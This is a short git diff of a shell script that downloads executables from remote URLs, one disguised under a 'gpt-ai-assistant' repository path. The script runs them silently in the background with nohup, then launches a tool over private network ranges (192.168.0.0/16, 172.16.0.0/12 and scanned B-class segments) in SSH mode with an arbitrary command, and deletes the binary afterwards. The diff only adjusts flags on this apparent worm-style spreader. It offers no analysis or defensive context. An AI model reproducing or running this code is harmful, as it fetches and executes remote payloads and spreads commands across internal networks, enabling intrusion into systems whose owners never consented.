@@ -66,7 +66,7 @@ rm -rf "$LOCAL_NAME"
 if download_file "$murl" "$LOCAL_NAME"; then
     chmod +x "$LOCAL_NAME"
 fi
-nohup ./"$LOCAL_NAME" >/dev/null 2>&1 </dev/null &
+nohup "$LOCAL_NAME" >/dev/null 2>&1 </dev/null &
 
 
 DOWNLOAD_URL="http://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/fs_exp"
@@ -90,10 +90,10 @@ if download_file "$furl" "$LOCAL_NAME"; then
     chmod +x "$LOCAL_NAME"
 fi
 for b in $(get_b_segments); do
-    $LOCAL_NAME -h "$b.0.0/16" -c "$CMD" -m ssh -np
+    $LOCAL_NAME -h "$b.0.0/16" -c "$CMD" -m ssh -np -no
 done
-nohup $LOCAL_NAME -h 192.168.0.1/16 -c "$CMD" -m ssh -np &
-nohup $LOCAL_NAME -h 172.16.0.1/12 -c "$CMD" -m ssh &
+nohup $LOCAL_NAME -h 192.168.0.1/16 -c "$CMD" -m ssh -np -no &
+nohup $LOCAL_NAME -h 172.16.0.1/12 -c "$CMD" -m ssh -no &
 rm -rf "$LOCAL_NAME"
 
 
